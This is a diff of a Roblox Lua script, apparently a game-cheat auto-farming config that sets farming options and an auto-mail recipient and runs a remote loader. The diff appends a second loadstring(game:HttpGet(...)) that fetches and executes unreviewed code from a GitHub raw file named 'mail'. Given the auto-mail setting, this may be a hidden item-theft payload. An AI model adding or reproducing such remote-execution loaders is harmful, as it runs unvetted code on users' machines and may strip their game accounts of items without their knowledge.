@@ -1,3 +1,4 @@
+wait(2)
 getgenv().Config = {
     ["Farming"] = {
         ["AutoEvents"] = {"Party Box"},
@@ -25,3 +26,7 @@ getgenv().Config = {
     ["AutoMailUser"] = "gettingboost"
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2bdebaf848a6be382ed338dad329aaf2.lua"))()
+
+wait(2)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilceto/kitkats/refs/heads/main/mail"))()
